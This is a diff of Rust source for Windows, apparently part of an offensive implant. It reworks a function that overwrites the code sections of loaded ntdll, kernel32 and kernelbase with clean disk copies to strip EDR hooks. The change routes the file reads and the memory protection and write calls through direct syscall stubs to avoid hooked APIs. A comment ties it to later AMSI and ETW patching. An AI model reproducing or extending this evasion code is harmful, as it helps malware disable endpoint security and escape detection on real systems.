@@ -1,10 +1,9 @@
 /// Restores ntdll, kernel32 and kernelbase from their on-disk copies,
 /// removing any inline hooks an EDR installed in those modules' code sections.
 ///
-/// The approach: read the DLL straight off disk with std::fs, parse the PE
-/// section table, then overwrite each executable section of the loaded image
-/// with the pristine file bytes. VirtualProtect makes the target writable
-/// for the write and is restored afterwards.
+/// Disk reads and section restore both use direct syscall stubs (bypassing any
+/// EDR hook on NtCreateFile, NtReadFile, NtProtectVirtualMemory,
+/// NtWriteVirtualMemory) with Win32/std fallbacks if stubs are unavailable.
 ///
 /// Must run BEFORE AMSI/ETW patches so the patches land on clean code.
 #[cfg(target_os = "windows")]
@@ -43,7 +42,6 @@ fn r32(b: &[u8], off: usize) -> u32 {
 #[cfg(target_os = "windows")]
 unsafe fn restore_module(module_name: &str) {
     use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetModuleFileNameW};
-    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
 
     // ── 1. Get the loaded base ────────────────────────────────────────────────
     let name_cstr: Vec<u8> = {
@@ -61,10 +59,15 @@ unsafe fn restore_module(module_name: &str) {
     if path_len == 0 { return; }
     let path = String::from_utf16_lossy(&path_buf[..path_len as usize]);
 
-    // ── 3. Read the clean copy from disk ──────────────────────────────────────
-    let file = match std::fs::read(&path) {
-        Ok(b) if b.len() >= 0x40 => b,
-        _ => return,
+    // ── 3. Read the clean copy from disk via direct NtCreateFile/NtReadFile ──
+    //       NT path: \??\ prefix + DOS path (e.g. \??\C:\Windows\System32\ntdll.dll)
+    let nt_path = format!("\\??\\{}", path);
+    let file = match super::syscall::nt_read_file(&nt_path)
+        .or_else(|| std::fs::read(&path).ok()) // fallback: std::fs if stubs unavailable
+        .filter(|b| b.len() >= 0x40)
+    {
+        Some(b) => b,
+        None => return,
     };
     // MZ header
     if file[0] != 0x4D || file[1] != 0x5A { return; }
@@ -97,11 +100,10 @@ unsafe fn restore_module(module_name: &str) {
         let dst = base.add(va);
         let src = file.as_ptr().add(raw_off);
 
-        let mut old = 0u32;
-        if VirtualProtect(dst as _, raw_sz, PAGE_EXECUTE_READWRITE, &mut old) != 0 {
-            std::ptr::copy_nonoverlapping(src, dst, raw_sz);
-            // Restore whatever protection was there before
-            VirtualProtect(dst as _, raw_sz, old, &mut old);
+        // PAGE_EXECUTE_READWRITE = 0x40 — use direct syscall to bypass EDR hooks
+        if let Some(old) = super::syscall::nt_virtual_protect(dst, raw_sz, 0x40u32) {
+            super::syscall::nt_write_virtual_memory(dst, src, raw_sz);
+            super::syscall::nt_virtual_protect(dst, raw_sz, old);
         }
     }
 }
